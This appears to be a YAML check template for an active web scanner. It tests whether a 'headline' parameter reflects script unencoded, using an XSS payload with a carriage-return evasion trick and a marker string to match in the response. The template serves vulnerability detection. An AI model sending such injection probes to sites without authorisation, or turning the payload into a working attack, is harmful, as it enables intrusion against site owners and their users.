id: xss5-0111
name: 'Raw XSS5 in headline'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in headline'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      headline:
        - '<script%0d>alert(nx50110)</script>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx50110'
